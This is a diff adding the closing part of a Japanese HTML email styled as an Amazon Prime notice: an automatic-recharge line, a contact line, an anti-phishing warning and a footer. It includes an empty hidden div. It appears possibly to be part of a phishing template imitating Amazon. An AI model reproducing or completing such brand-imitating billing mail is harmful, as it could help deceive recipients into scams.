+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(51,51,51); PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px'>更新完了後、自動的に会員費の再請求が行われます。</TD>
+<div hidden aria-hidden="true" style="display:none !important;max-height:0;overflow:hidden;"><article role="presentation"><header></header><section></section></article></div>
+</TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+            <P 
+            style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(85,85,85); MARGIN: 0px 0px 16px; LINE-HEIGHT: 1.8'>ご不明な点がございましたら、<A 
+            style="TEXT-DECORATION: none; COLOR: rgb(0,113,133)" 
+            href="https://www.amazon.co.jp/contact">Amazonカスタマーサービス</A>までお気軽にお問い合わせください。 
+            </P>
+            <P 
+            style='FONT-SIZE: 14px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(51,51,51); MARGIN: 0px; LINE-HEIGHT: 1.8'>今後ともAmazonをよろしくお願いいたします。<BR><STRONG>Amazonプライム 
+            カスタマーサービスチーム</STRONG> </P></TD></TR><!-- ===== DIVIDER ===== -->
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 32px; PADDING-RIGHT: 32px">
+            <HR 
+            style="BORDER-TOP: 1px solid; BORDER-RIGHT: medium none; BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; MARGIN: 0px; border-image: none">
+          </TD></TR><!-- ===== SECURITY NOTICE ===== -->
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 16px; PADDING-TOP: 16px; PADDING-LEFT: 32px; PADDING-RIGHT: 32px; BACKGROUND-COLOR: rgb(250,250,250)">
+            <TABLE width="100%" border=0 cellSpacing=0 cellPadding=0>
+              <TBODY>
+              <TR>
+                <TD 
+                  style="WIDTH: 20px; VERTICAL-ALIGN: top; PADDING-TOP: 1px"><SPAN 
+                  style="FONT-SIZE: 14px; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(255,153,0)">!</SPAN> 
+                </TD>
+                <TD 
+                style='FONT-SIZE: 12px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(118,118,118); LINE-HEIGHT: 1.7'>Amazonは、パスワードやクレジットカード番号などの個人情報をメールでお聞きすることは一切ございません。不審に思われた場合は、<A 
+                  style="TEXT-DECORATION: none; COLOR: rgb(0,113,133)" 
+                  href="https://www.amazon.co.jp/report">フィッシング詐欺として報告</A>してください。 
+                </TD></TR></TBODY></TABLE></TD></TR><!-- ===== DIVIDER ===== -->
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 32px; PADDING-RIGHT: 32px">
+            <HR 
+            style="BORDER-TOP: 1px solid; BORDER-RIGHT: medium none; BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; MARGIN: 0px; border-image: none">
+          </TD></TR><!-- ===== FOOTER ===== -->
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 32px; PADDING-RIGHT: 32px; BACKGROUND-COLOR: rgb(255,255,255)">
+            <P 
+            style='FONT-SIZE: 11px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(170,170,170); TEXT-ALIGN: center; MARGIN: 0px 0px 8px'>このメールはAmazonプライム会員のお客様に自動送信されています。<BR>このアドレスへの返信は受け付けておりません（配信専用）。 
+            </P>
+            <P 
+            style="FONT-SIZE: 11px; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(170,170,170); TEXT-ALIGN: center; MARGIN: 0px 0px 8px"><A 
+            style="TEXT-DECORATION: none; COLOR: rgb(0,113,133)" 
+            href="https://www.amazon.co.jp/privacy">プライバシー規約</A> &nbsp;|&nbsp; 
+            <A style="TEXT-DECORATION: none; COLOR: rgb(0,113,133)" 
+            href="https://www.amazon.co.jp/conditions">ご利用条件</A> &nbsp;|&nbsp; 
+            <A style="TEXT-DECORATION: none; COLOR: rgb(0,113,133)" 
+            href="https://www.amazon.co.jp/prime">プライム会員情報</A> </P>
+            <P 
+            style="FONT-SIZE: 11px; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(170,170,170); TEXT-ALIGN: center; MARGIN: 0px">? 
+            2026 Amazon.com, Inc. or its affiliates.<BR>Amazon Japan G.K., 1-8-1 
+            Shimomeguro, Meguro-ku, Tokyo 153-0064, Japan.<BR>All rights 
+            reserved. Amazon, Prime and related logos are trademarks of Amazon. 
+            </P></TD></TR></TBODY></TABLE><!-- /Email container --></TD></TR></TBODY></TABLE><BR><BR>
+</body>
+</html>
+
+------=_PtqwCbuz_735_58AC9_95X63423.3271280N--
+
